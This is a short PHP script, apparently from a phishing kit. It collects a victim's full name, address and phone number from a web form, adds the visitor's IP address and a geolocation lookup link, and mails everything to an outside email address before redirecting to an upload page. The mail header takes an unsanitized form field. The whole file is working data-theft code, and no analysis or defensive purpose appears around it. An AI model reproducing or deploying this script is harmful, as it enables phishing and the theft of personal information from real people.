<?php


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+Don| BESMELLAH |DJOU+------------\n";
$bilsmg .= "|Full Name-----: ".$_POST['full']."<br>\n";
$bilsmg .= "|Address-----: ".$_POST['address']."<br>\n";
$bilsmg .= "|Phone Number-----: ".$_POST['phone']."<br>\n";
;

$bilsmg .= "------------+Don| HAMDOULELLEH |DJOU+------------\n";
$bilsmg .= "From $ip             check in http://www.geoiptool.com/?IP=$ip   \n";


$bilsnd = "administrator@welcome-en.us";
$bilsub = "Memex CID | From $ip";
$bilhead = "From:Memex Cado <KOMANDAN>";
$bilhead .= $_POST['bat']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

$src="../upload-file.php";
header("location:$src");
?>